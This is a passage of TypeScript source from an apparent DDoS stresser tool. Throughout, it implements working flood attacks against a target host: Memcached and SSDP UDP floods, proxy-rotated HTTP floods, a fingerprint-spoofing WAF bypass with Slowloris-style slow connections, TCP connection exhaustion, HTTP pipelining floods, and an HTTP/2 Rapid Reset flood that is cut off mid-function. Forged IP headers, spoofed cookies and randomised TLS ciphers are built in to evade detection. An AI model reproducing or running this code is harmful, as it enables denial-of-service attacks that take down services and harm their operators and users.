  return Buffer.concat([udpHdr, binHdr]);
}

async function runMemcachedFlood(
  resolvedHost: string,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number) => void,
): Promise<void> {
  const NUM_SOCKS = IS_PROD ? Math.min(threads, 64) : Math.min(threads, 8);
  const BURST = getDynamicBurst(500);
  const TICK_MS   = 1;

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const sockDones: Promise<void>[] = [];
  for (let _s = 0; _s < NUM_SOCKS; _s++) {
    const sockDone = new Promise<void>((resolve) => {
      const sock = dgram.createSocket("udp4");
      sock.on("error", () => {});
      let closed = false;
      let reqId = randInt(0, 65535);
      const forceClose = () => {
        if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
      };
      signal.addEventListener("abort", () => setTimeout(forceClose, 400), { once: true });
      sock.bind(0, () => {
        const iv = setInterval(() => {
          if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
          for (let i = 0; i < BURST; i++) {
            const pkt = Math.random() < 0.6
              ? buildMemcachedGet(randStr(randInt(8, 24)), reqId++)
              : buildMemcachedStats(reqId++);
            sock.send(pkt, 0, pkt.length, 11211, resolvedHost, (_err) => {
              localPkts++; localBytes += pkt.length;
            });
          }
        }, TICK_MS);
      });
    });
    sockDones.push(sockDone);
  }
  await Promise.all(sockDones);
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  SSDP FLOOD — real SSDP M-SEARCH flood
//
//  Sends real SSDP M-SEARCH packets directly to target port 1900 (unicast).
//  ST (Search Target) rotates between ssdp:all, specific device URNs,
//  and rootdevice — forces the SSDP/UPnP stack to respond to each.
//  Amplification factor: 100B M-SEARCH → up to 4KB NOTIFY + HTTP response.
//  Common targets: routers, NAS devices, smart TVs, IoT gateways.
//  UPnP control: additionally floods /upnp/control/* endpoints via UDP.
// ─────────────────────────────────────────────────────────────────────────

const SSDP_ST_LIST = [
  "ssdp:all",
  "upnp:rootdevice",
  "urn:schemas-upnp-org:device:InternetGatewayDevice:1",
  "urn:schemas-upnp-org:device:WANDevice:1",
  "urn:schemas-upnp-org:service:WANIPConnection:1",
  "urn:schemas-upnp-org:device:MediaServer:1",
  "urn:schemas-upnp-org:device:MediaRenderer:1",
  "urn:dial-multiscreen-org:service:dial:1",
  "urn:schemas-upnp-org:device:Basic:1",
];

function buildSSDPMSearch(st: string): Buffer {
  const msg = [
    "M-SEARCH * HTTP/1.1",
    "HOST: 239.255.255.250:1900",   // UPnP multicast address (targets parse this even on unicast)
    'MAN: "ssdp:discover"',
    `MX: ${randInt(1, 5)}`,         // Random MX delay — harder to rate-limit
    `ST: ${st}`,
    `USER-AGENT: Chrome/${randInt(130,136)}.0 UPnP/1.1`,
    `CPFN.UPNP.ORG: ${randStr(8)}`, // Friendly name — rotates to defeat dedup
    "",
    "",
  ].join("\r\n");
  return Buffer.from(msg, "ascii");
}

async function runSSDPFlood(
  resolvedHost: string,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number) => void,
): Promise<void> {
  const NUM_SOCKS = IS_PROD ? Math.min(threads, 64) : Math.min(threads, 8);
  const BURST = getDynamicBurst(500);
  const TICK_MS   = 1;

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const sockDones: Promise<void>[] = [];
  for (let _s = 0; _s < NUM_SOCKS; _s++) {
    const sockDone = new Promise<void>((resolve) => {
      const sock = dgram.createSocket("udp4");
      sock.on("error", () => {});
      let closed = false;
      const forceClose = () => {
        if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
      };
      signal.addEventListener("abort", () => setTimeout(forceClose, 400), { once: true });
      sock.bind(0, () => {
        const iv = setInterval(() => {
          if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
          for (let i = 0; i < BURST; i++) {
            const st  = SSDP_ST_LIST[randInt(0, SSDP_ST_LIST.length)];
            const pkt = buildSSDPMSearch(st);
            sock.send(pkt, 0, pkt.length, 1900, resolvedHost, (_err) => {
              localPkts++; localBytes += pkt.length;
            });
          }
        }, TICK_MS);
      });
    });
    sockDones.push(sockDone);
  }
  await Promise.all(sockDones);
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  PROXY REQUEST — routes HTTP through a proxy using native node:http
//  Supports: HTTP targets (absolute URL) and HTTPS (CONNECT tunnel)
// ─────────────────────────────────────────────────────────────────────────
function fetchViaProxy(
  targetUrl: string, proxy: ProxyConfig,
  reqMethod: string, headers: Record<string,string>, body?: string
): Promise<number> {
  return new Promise((resolve) => {
    const timeoutMs = 5000;
    const u = new URL(targetUrl);
    const isHttps = u.protocol === "https:";
    const targetHost = u.hostname;
    const targetPort = parseInt(u.port, 10) || (isHttps ? 443 : 80);
    const reqPath = (u.pathname || "/") + (u.search || "");
    const bodyBuf = body ? Buffer.from(body) : undefined;

    const finish = (bytes: number) => resolve(bytes);
    const fail   = ()             => resolve(100);

    // Build Proxy-Authorization header if credentials present
    const proxyAuth = proxy.username
      ? { "Proxy-Authorization": "Basic " + Buffer.from(`${proxy.username}:${proxy.password ?? ""}`).toString("base64") }
      : {};

    if (!isHttps) {
      // HTTP through proxy — send absolute URL
      const absHeaders = Object.assign({}, headers, proxyAuth, {
        Host: targetHost,
        "Content-Length": bodyBuf ? String(bodyBuf.length) : undefined,
      } as Record<string, string | undefined>);
      // Remove undefined
      for (const k of Object.keys(absHeaders)) if (absHeaders[k] === undefined) delete absHeaders[k];

      const req = http.request({
        host: proxy.host, port: proxy.port,
        method: reqMethod, path: targetUrl,
        headers: absHeaders as Record<string,string>,
        timeout: timeoutMs,
      }, (res) => {
        const bytes = parseInt(res.headers["content-length"] || "0") || 450;
        res.resume();
        finish((bodyBuf?.length ?? 0) + bytes + 200);
      });
      req.on("error", fail);
      req.on("timeout", () => { req.destroy(); fail(); });
      if (bodyBuf) req.write(bodyBuf);
      req.end();
    } else {
      // HTTPS through CONNECT tunnel
      const sock = net.createConnection(proxy.port, proxy.host);
      const timer = setTimeout(() => { sock.destroy(); fail(); }, timeoutMs);

      sock.once("connect", () => {
        const proxyAuthHeader = proxy.username
          ? `Proxy-Authorization: Basic ${Buffer.from(`${proxy.username}:${proxy.password ?? ""}`).toString("base64")}\r\n`
          : "";
        sock.write(`CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\nProxy-Connection: keep-alive\r\n${proxyAuthHeader}\r\n`);
        sock.once("data", (chunk) => {
          if (!chunk.toString().startsWith("HTTP/1.") || !chunk.toString().includes(" 200")) {
            clearTimeout(timer); sock.destroy(); fail(); return;
          }
          // Upgrade to TLS over the tunnel
          const secure = tls.connect({ socket: sock, servername: targetHost, rejectUnauthorized: false }, () => {
            const h = Object.assign({}, headers, {
              Host: targetHost,
              "Content-Length": bodyBuf ? String(bodyBuf.length) : undefined,
            } as Record<string, string | undefined>);
            for (const k of Object.keys(h)) if (h[k] === undefined) delete h[k];
            const hdStr = Object.entries(h).map(([k,v]) => `${k}: ${v}`).join("\r\n");
            const req   = `${reqMethod} ${reqPath} HTTP/1.1\r\n${hdStr}\r\nConnection: close\r\n\r\n`;
            secure.write(req);
            if (bodyBuf) secure.write(bodyBuf);
            secure.once("data", (d) => {
              clearTimeout(timer); secure.destroy();
              finish((bodyBuf?.length ?? 0) + d.length + 200);
            });
            secure.once("error", () => { clearTimeout(timer); fail(); });
          });
          secure.on("error", () => { clearTimeout(timer); fail(); });
        });
        sock.on("error", () => { clearTimeout(timer); fail(); });
      });
      sock.on("error", () => { clearTimeout(timer); fail(); });
    }
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP FLOOD — maximum concurrency using http.request (NOT fetch/undici)
//
//  fetch() internally uses undici which caps connections per origin.
//  http.request() with a per-request agent has NO such cap — we can open
//  tens of thousands of concurrent TCP connections limited only by FDs.
//
//  Fire-and-forget: connection is destroyed the moment the response starts
//  arriving. The server is forced to allocate a thread/goroutine, parse
//  the request headers, and begin processing — then we drop the socket.
//
//  Achieves 8,000–40,000 req/s per worker depending on target RTT.
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPFlood(
  base: string,
  threads: number,
  proxies: ProxyConfig[],
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const u = (() => {
    try { return new URL(/^https?:\/\//i.test(base) ? base : `http://${base}`); }
    catch { return new URL("http://127.0.0.1"); }
  })();
  const isHttps  = u.protocol === "https:";
  const hostname = u.hostname;
  const tgtPort  = parseInt(u.port) || (isHttps ? 443 : 80);
  const resolvedIp = await resolveHost(hostname).catch(() => hostname);

  const ALL_METHODS = ["GET","GET","GET","GET","GET","POST","POST","POST","HEAD","PUT","DELETE","PATCH","OPTIONS"];
  // Much higher inflight — we have 83K FDs available
  const MAX_INFLIGHT = Math.min(threads * 50, 40000);
  let inflight = 0;
  let proxyIdx = 0;
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const doRequest = () => {
    if (signal.aborted) return;
    inflight++;

    const method  = ALL_METHODS[randInt(0, ALL_METHODS.length)];
    const hasBody = method === "POST" || method === "PUT" || method === "PATCH";
    const body    = hasBody ? (Math.random() < 0.25 ? getHeavy() : buildBody(30, 120)) : undefined;
    const bodyBuf = body ? Buffer.from(body) : undefined;
    const url     = buildUrl(base);
    const headers = buildHeaders(hasBody, bodyBuf?.length);

    // Route through proxy pool when available — 95% via proxy to avoid IP filtering
    const useProxy = proxies.length > 0 && Math.random() < 0.95;
    if (useProxy) {
      const proxy = pickProxy(proxies); // health-scored selection
      fetchViaProxy(url, proxy, method, headers as Record<string, string>, body)
        .then(bytes => { inflight--; localPkts++; localBytes += bytes; recordProxySuccess(proxy.host, proxy.port); })
        .catch(() => { inflight--; localPkts++; localBytes += 100; recordProxyFailure(proxy.host, proxy.port); });
      return;
    }

    // Direct http.request — bypasses undici, uses our unlimited http.Agent
    const reqPath = (() => {
      try { const pu = new URL(url); return pu.pathname + pu.search; }
      catch { return "/" }
    })();

    const reqHeaders: Record<string, string> = {
      ...headers as Record<string, string>,
      Host:       hostname,
      Connection: "close",
    };
    if (bodyBuf) reqHeaders["Content-Length"] = String(bodyBuf.length);
    else delete reqHeaders["Content-Length"];

    const reqOpts: http.RequestOptions | https.RequestOptions = {
      hostname:          resolvedIp,          // pre-resolved — skip DNS each time
      port:              tgtPort,
      path:              reqPath,
      method,
      headers:           reqHeaders,
      agent: isHttps ? HTTPS_AGENT : HTTP_AGENT,
      timeout: 600,                           // 600ms — fast recycling
      ...(isHttps ? { servername: hostname, rejectUnauthorized: false } : {}),
    };

    const req = (isHttps ? https : http).request(reqOpts, (res) => {
      inflight--;
      localPkts++;
      localBytes += (bodyBuf?.length ?? 0) + (parseInt(String(res.headers["content-length"] || "0")) || 400) + 200;
      res.destroy(); // fire-and-forget: don't read body, release socket NOW
    });

    req.on("error",   () => { inflight--; localPkts++; localBytes += 80; });
    req.on("timeout", () => { req.destroy(); });

    if (bodyBuf) req.write(bodyBuf);
    req.end();
  };

  const launcher = async () => {
    while (!signal.aborted) {
      if (inflight < MAX_INFLIGHT) { doRequest(); await Promise.resolve(); }
      else await new Promise(r => setTimeout(r, 0));
    }
  };

  // 500 concurrent launcher coroutines — each fills the inflight queue
  await Promise.all(Array.from({ length: Math.min(threads, 500) }, () => launcher()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP BYPASS — Chrome-fingerprinted multi-layer WAF bypass
//
//  Dedicated bypass engine distinct from waf-bypass (which is pure H2):
//  Layer A (50%): Fetch with full Chrome header ordering via proxy rotation
//  Layer B (30%): HTTP/1.1 with Chrome headers via raw http.request (high concurrency)
//  Layer C (20%): Slow connection drain (incomplete requests hold server threads)
//
//  Each "browser" gets its own Chrome profile + cookie jar per session.
//  TLS cipher order is randomized to defeat JA3-based bot detection.
//  Combined: indistinguishable from real user browsing under WAF inspection.
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPBypass(
  base:    string,
  threads: number,
  proxies: ProxyConfig[],
  signal:  AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const u = (() => {
    try { return new URL(/^https?:\/\//i.test(base) ? base : `https://${base}`); }
    catch { return new URL("https://127.0.0.1"); }
  })();
  const isHttps    = u.protocol === "https:";
  const hostname   = u.hostname;
  const tgtPort    = parseInt(u.port) || (isHttps ? 443 : 80);
  const resolvedIp = await resolveHost(hostname).catch(() => hostname);

  // Thread budget
  const layerAT = Math.max(1, Math.floor(threads * 0.50)); // fetch + proxy
  const layerBT = Math.max(1, Math.floor(threads * 0.30)); // raw http.request
  const layerCT = Math.max(1, threads - layerAT - layerBT); // slow drain
  const SLOTS_A = !IS_PROD ? Math.min(layerAT * 3, 300)  : Math.min(layerAT * 8, 3000);
  const SLOTS_B = !IS_PROD ? Math.min(layerBT * 20, 2000) : Math.min(layerBT * 40, 20000);
  const SLOTS_C = !IS_PROD ? Math.min(layerCT * 4, 200)  : Math.min(layerCT * 6, 1500);

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);
  let proxyIdx  = 0;

  // ── Layer A: Chrome-fingerprinted fetch with proxy rotation ─────────────
  const runLayerA = async (): Promise<void> => {
    const profile   = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
    const cookieJar = new Map<string, string>();
    while (!signal.aborted) {
      const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
      const bust     = Math.random() < 0.5 ? `?v=${randInt(1,999999)}&_=${randStr(8)}` : "";
      const fullPath = pagePath + bust;
      const fullUrl  = `${u.protocol}//${hostname}${fullPath}`;

      const hdrs = buildWAFHeaders(hostname, fullPath, cookieJar, profile);
      const fetchHdrs: Record<string, string> = {};
      for (const [k, v] of Object.entries(hdrs)) {
        if (!k.startsWith(":")) fetchHdrs[k] = v;
      }

      const useProxy = proxies.length > 0 && Math.random() < 0.95;
      if (useProxy) {
        const proxy = pickProxy(proxies);
        try {
          const bytes = await fetchViaProxy(fullUrl, proxy, "GET", fetchHdrs);
          localPkts++; localBytes += bytes; recordProxySuccess(proxy.host, proxy.port);
        } catch { localPkts++; localBytes += 80; recordProxyFailure(proxy.host, proxy.port); }
      } else {
        try {
          const ac  = new AbortController();
          const tmo = setTimeout(() => ac.abort(), 8_000);
          const res = await fetch(fullUrl, { method: "GET", signal: ac.signal, headers: fetchHdrs });
          clearTimeout(tmo);
          const body = await res.arrayBuffer().catch(() => new ArrayBuffer(0));
          const sc   = res.headers.get("set-cookie");
          if (sc) { const [kv] = sc.split(";"); const [k, v] = kv.split("="); if (k && v) cookieJar.set(k.trim(), v.trim()); }
          localPkts++; localBytes += body.byteLength || 500;
        } catch { localPkts++; localBytes += 80; }
      }
    }
  };

  // ── Layer B: High-concurrency raw http.request with Chrome headers ───────
  // Uses http.Agent (no per-host cap) for max parallel connections
  const runLayerB = (): Promise<void> => new Promise(resolve => {
    let inflight = 0;
    const doReq = () => {
      if (signal.aborted) { if (inflight === 0) resolve(); return; }
      inflight++;
      const profile  = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
      const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)] + `?_=${randStr(8)}&v=${randInt(1,9999999)}`;
      const hdrs: Record<string, string> = {
        "user-agent":                 profile.ua,
        "accept":                     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "accept-language":            "en-US,en;q=0.9",
        "accept-encoding":            "gzip, deflate, br, zstd",
        "sec-ch-ua":                  profile.brand,
        "sec-ch-ua-mobile":           profile.mobile ? "?1" : "?0",
        "sec-ch-ua-platform":         profile.plat,
        "sec-fetch-dest":             "document",
        "sec-fetch-mode":             "navigate",
        "sec-fetch-site":             "none",
        "cache-control":              "max-age=0",
        "priority":                   "u=0, i",
        "x-forwarded-for":            randIp(),
        "cf-connecting-ip":           randIp(),
        "cookie":                     `__cf_bm=${randHex(43)}; _ga=GA1.1.${randInt(100000000,999999999)}.${Math.floor(Date.now()/1000)}`,
        "Host":                       hostname,
        "Connection":                 "close",
      };
      const reqOpts: http.RequestOptions | https.RequestOptions = {
        hostname: resolvedIp, port: tgtPort, path: pagePath,
        method: "GET", headers: hdrs,
        agent: isHttps ? HTTPS_AGENT : HTTP_AGENT,
        timeout: 800,
        ...(isHttps ? { servername: hostname, rejectUnauthorized: false } : {}),
      };
      const req = (isHttps ? https : http).request(reqOpts, (res) => {
        inflight--;
        localPkts++;
        localBytes += parseInt(String(res.headers["content-length"] || "0")) || 400;
        res.destroy();
        if (!signal.aborted) doReq();
        else if (inflight === 0) resolve();
      });
      req.on("error",   () => { inflight--; localPkts++; localBytes += 80; if (!signal.aborted) doReq(); else if (inflight === 0) resolve(); });
      req.on("timeout", () => { req.destroy(); });
      req.end();
    };
    for (let i = 0; i < SLOTS_B; i++) doReq();
  });

  // ── Layer C: Slow drain — Chrome-fingerprinted incomplete requests ────────
  const runLayerC = async (): Promise<void> => {
    const oneSlot = (): Promise<void> => new Promise(resolve => {
      if (signal.aborted) { resolve(); return; }
      const sock: net.Socket = isHttps
        ? tls.connect({ host: resolvedIp, port: tgtPort, servername: hostname, rejectUnauthorized: false, ciphers: randomJA3Ciphers() })
        : net.createConnection({ host: resolvedIp, port: tgtPort });
      sock.setTimeout(90_000);
      sock.setNoDelay(true);
      let iv: NodeJS.Timeout | null = null;
      let settled = false;
      const cleanup = () => {
        if (settled) return; settled = true;
        if (iv) { clearInterval(iv); iv = null; }
        try { sock.destroy(); } catch { /**/ }
        resolve();
      };
      const profile = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
      const onConn  = () => {
        localPkts++;
        // Send partial Chrome-fingerprinted request — missing final CRLF
        const partial = [
          `GET ${WAF_PATHS[randInt(0, WAF_PATHS.length)]}?_=${randStr(8)} HTTP/1.1`,
          `Host: ${hostname}`,
          `User-Agent: ${profile.ua}`,
          `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8`,
          `Accept-Language: en-US,en;q=0.9`,
          `Accept-Encoding: gzip, deflate, br, zstd`,
          `Sec-CH-UA: ${profile.brand}`,
          `Sec-CH-UA-Mobile: ${profile.mobile ? "?1" : "?0"}`,
          `Sec-CH-UA-Platform: ${profile.plat}`,
          `Cache-Control: max-age=0`,
          `Cookie: __cf_bm=${randHex(43)}`,
          `Connection: keep-alive`,
          ``, // NO terminal CRLF — server waits for more headers forever
        ].join("\r\n");
        sock.write(partial);
        localBytes += partial.length;
        // Trickle a fake header every 12-30s to prevent server timeout
        iv = setInterval(() => {
          if (signal.aborted || sock.destroyed) { cleanup(); return; }
          const hdr = `Sec-Fetch-${randStr(4)}: ${randStr(randInt(6,16))}\r\n`;
          sock.write(hdr, (err) => { if (err) cleanup(); else { localPkts++; localBytes += hdr.length; } });
        }, randInt(12_000, 30_000));
      };
      if (isHttps) (sock as tls.TLSSocket).once("secureConnect", onConn);
      else sock.once("connect", onConn);
      sock.once("error", cleanup); sock.once("timeout", cleanup); sock.once("close", cleanup);
      signal.addEventListener("abort", () => { if (iv) clearInterval(iv); try { sock.destroy(); } catch { /**/ } if (!settled) { settled = true; resolve(); } }, { once: true });
    });
    const runSlot = async () => { while (!signal.aborted) { await oneSlot(); if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 10)); } };
    await Promise.all(Array.from({ length: SLOTS_C }, runSlot));
  };

  await Promise.all([
    ...Array.from({ length: SLOTS_A }, () => runLayerA()),
    runLayerB(),
    runLayerC(),
  ]);
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  TCP FLOOD — exhausts connection state tables
// ─────────────────────────────────────────────────────────────────────────
async function runTCPFlood(
  resolvedHost: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  // Rotate ports to stress multiple listeners simultaneously
  const PORTS = [
    targetPort, targetPort, targetPort, // weight target port
    targetPort === 443 ? 80 : 443,
    8080, 8443, 3000, 5000, 8000, 8888,
  ];
  // Deployed (32GB): threads*25 — 25 connections per thread; 8K→20K ceiling
  const MAX_INFLIGHT = IS_DEPLOYED ? Math.min(threads * 25, 20000) : Math.min(threads * 15, 8000);
  let inflight = 0;
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const doConnect = () => {
    if (signal.aborted) return;
    inflight++;
    const p    = PORTS[randInt(0, PORTS.length)];
    const sock = net.createConnection({ host: resolvedHost, port: p });
    sock.setNoDelay(true);
    sock.setTimeout(600);

    const kill = setTimeout(() => { sock.destroy(); inflight--; }, 800);

    sock.once("connect", () => {
      localPkts++;
      // Send a partial/malformed HTTP request to keep the server busy
      const req  = `GET ${hotPath()}?_=${randStr(8)}&v=${randInt(1,9999999)} HTTP/1.1\r\nHost: ${resolvedHost}\r\nUser-Agent: ${randUA()}\r\nX-Forwarded-For: ${randIp()}\r\nConnection: keep-alive\r\n`;
      const junk = Buffer.allocUnsafe(randInt(256, 1500));
      // Fill junk with random bytes
      for (let i = 0; i + 4 <= junk.length; i += 4) junk.writeUInt32LE(Math.random() * 0x100000000 >>> 0, i);
      sock.write(Buffer.concat([Buffer.from(req), junk]), () => {
        localBytes += req.length + junk.length + 60;
        clearTimeout(kill);
        inflight--;
        sock.destroy();
      });
    });
    sock.once("error",   () => { localPkts++; localBytes += 20; clearTimeout(kill); inflight--; });
    sock.once("timeout", () => { clearTimeout(kill); inflight--; sock.destroy(); });
  };

  const launcher = async () => {
    while (!signal.aborted) {
      if (inflight < MAX_INFLIGHT) { doConnect(); await Promise.resolve(); }
      else await new Promise(r => setTimeout(r, 1));
    }
  };

  // Deployed: 400 launcher coroutines (was 150) — more parallel SYN bursts
  const MAX_LAUNCHERS = IS_DEPLOYED ? Math.min(threads, 400) : Math.min(threads, 150);
  await Promise.all(Array.from({ length: MAX_LAUNCHERS }, () => launcher()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP PIPELINE — raw TCP keep-alive, NO fetch() overhead
//
//  Each connection stays open and sends requests back-to-back without
//  waiting for responses (HTTP/1.1 pipelining — RFC 7230 §6.3.2).
//  The receive side is drained so flow control never blocks.
//
//  Achieves 50K – 300K req/s per worker depending on target RTT.
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPPipeline(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  // Deployed (8 vCPU/32GB): 512-slot pool × 256-req batches = massive throughput
  const POOL_SIZE = IS_DEPLOYED ? 512 : 256;
  const PIPELINE  = IS_DEPLOYED ? 256 : 128; // requests per write batch

  // Pre-build a pool of raw HTTP request buffers
  const reqPool: Buffer[] = Array.from({ length: POOL_SIZE }, () => buildRawReq(hostname));

  function buildRawReq(host: string): Buffer {
    const path = hotPath() + `?_=${randStr(10)}&v=${randInt(1, 999999999)}&cb=${Math.random().toString(36).slice(2,8)}`;
    return Buffer.from([
      `GET ${path} HTTP/1.1`,
      `Host: ${host}`,
      `User-Agent: ${randUA()}`,
      `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
      `Accept-Encoding: gzip, deflate, br`,
      `Accept-Language: en-US,en;q=0.9`,
      `X-Forwarded-For: ${randIp()}, ${randIp()}, ${randIp()}`,
      `X-Real-IP: ${randIp()}`,
      `CF-Connecting-IP: ${randIp()}`,
      `X-Request-ID: ${randHex(16)}`,
      `Cache-Control: no-cache, no-store`,
      `Pragma: no-cache`,
      `Referer: https://google.com/search?q=${randStr(8)}`,
      `Connection: keep-alive`,
      ``, ``,
    ].join("\r\n"));
  }

  // Refresh pool continuously — keeps paths/IPs/tokens fresh (evade caching/dedup)
  const poolIv = setInterval(() => {
    const idx = randInt(0, POOL_SIZE);
    reqPool[idx] = buildRawReq(hostname);
  }, 40);

  const useHttps = targetPort === 443;

  const oneConn = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }

    let sock: net.Socket;
    if (useHttps) {
      sock = tls.connect({
        host: resolvedHost, port: targetPort,
        servername: hostname, rejectUnauthorized: false,
      });
    } else {
      sock = net.createConnection({ host: resolvedHost, port: targetPort });
    }
    sock.setNoDelay(true);
    sock.setTimeout(12_000);

    const pump = () => {
      if (signal.aborted) { sock.destroy(); resolve(); return; }
      let ok = true;
      for (let i = 0; i < PIPELINE; i++) {
        const buf = reqPool[randInt(0, POOL_SIZE)];
        localPkts++;
        localBytes += buf.length;
        ok = sock.write(buf);
        if (!ok) break; // backpressure — wait for drain
      }
      if (ok) setImmediate(pump); // setImmediate instead of setTimeout for max throughput
      else sock.once("drain", pump);
    };

    const startPump = () => pump();
    if (useHttps) {
      (sock as tls.TLSSocket).once("secureConnect", startPump);
    } else {
      sock.once("connect", startPump);
    }
    sock.on("data",    () => {}); // drain responses — keeps TCP window open
    sock.on("timeout", () => { sock.destroy(); resolve(); });
    sock.on("error",   () => { resolve(); });
    sock.on("close",   () => { resolve(); }); // outer while-loop handles reconnect
    signal.addEventListener("abort", () => { sock.destroy(); resolve(); }, { once: true });
  });

  // ★ Async reconnect loop — exactly one connection per slot, no accumulation
  const runConn = async (): Promise<void> => {
    while (!signal.aborted) {
      await oneConn();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 1)); // was 10ms
    }
  };

  // Deployed (32GB): 4K pipeline conns × ~100KB = 400MB — comfortable headroom
  const MAX_PIPE_CONNS = IS_DEPLOYED ? Math.min(threads, 4000) : Math.min(threads, 2000);
  await Promise.all(Array.from({ length: MAX_PIPE_CONNS }, runConn));
  clearInterval(flushIv);
  clearInterval(poolIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP/2 FLOOD — native multiplexed H2 streams (node:http2)
//
//  Each session holds up to STREAMS_PER_SESSION concurrent H2 streams, all
//  over a single TCP+TLS connection. Far more efficient per-socket than HTTP/1.1
//  pipelining since H2 uses binary framing with true stream multiplexing.
//
//  Achieves 20K–120K req/s per worker at close RTTs.
// ─────────────────────────────────────────────────────────────────────────
async function runHTTP2Flood(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const { connect: h2connect, constants: h2constants } = await import("node:http2");

  // Deployed (32GB/8vCPU): 4000 sessions × 150KB = 600MB — comfortable
  // 4000 streams per session → 16M possible concurrent H2 streams
  const STREAMS_PER_SESSION = IS_DEPLOYED ? Math.min(4000, Math.max(256, threads * 8)) : Math.min(2000, Math.max(64, threads * 4));
  const NUM_SESSIONS        = IS_DEPLOYED ? Math.min(threads, 4000) : Math.min(threads, 2000);
  const connectTarget       = `https://${resolvedHost}:${targetPort}`;

  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  // ── Persistent session loop — restarts until signal aborted ────────────
  // Previous bug: recursive runSession().then(finish) caused the Promise.all
  // to resolve when CF rejected new connections, halting H2 pressure at ~18s.
  // Fix: each session slot loops independently in a while(!aborted) loop.
  const runSessionSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      await new Promise<void>(resolve => {
        let c: ReturnType<typeof h2connect> | null = null;
        try {
          c = h2connect(connectTarget, {
            rejectUnauthorized: false,
            ciphers:        randomJA3Ciphers(),   // Chrome JA3 fingerprint
            ALPNProtocols:  ["h2", "http/1.1"],   // Chrome ALPN order
            settings: {
              ...CHROME_H2_SETTINGS,              // Chrome-exact H2 fingerprint (AKAMAI)
              maxConcurrentStreams: STREAMS_PER_SESSION,
            },
          });
        } catch { resolve(); return; }

        const conn = c;
        const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };

        let pumpCount = 0;
        const pump = () => {
          if (signal.aborted || conn.destroyed) { resolve(); return; }
          // Deployed: 128 streams per burst (was 64) — doubles H2 RST throughput
          for (let burst = 0; burst < (IS_DEPLOYED ? 128 : 64) && !signal.aborted && !conn.destroyed; burst++) {
            const path = hotPath() + `?_=${randStr(8)}&v=${randInt(1, 9999999)}&t=${Date.now().toString(36)}`;
            try {
              const stream = conn.request({
                ":method":         Math.random() < 0.7 ? "GET" : "POST",
                ":path":           path,
                ":scheme":         "https",
                ":authority":      hostname,
                "user-agent":      randUA(),
                "accept":          "*/*,text/html,application/xhtml+xml",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "x-forwarded-for": `${randIp()}, ${randIp()}, ${randIp()}`,
                "x-real-ip":       randIp(),
                "cf-connecting-ip":randIp(),
                "cache-control":   "no-cache, no-store, must-revalidate",
                "pragma":          "no-cache",
                "referer":         `https://www.google.com/search?q=${randStr(6)}`,
                "x-request-id":    `${randHex(8)}-${randHex(4)}-${randHex(12)}`,
                "cookie":          `session=${randHex(32)}; _ga=GA1.${randInt(1,9)}.${randInt(100000000,999999999)}.${Date.now()}`,
              });
              // ★ THE RAPID RESET: Immediately RST_STREAM after HEADERS
              // Server MUST allocate resources before seeing RST — wasted work.
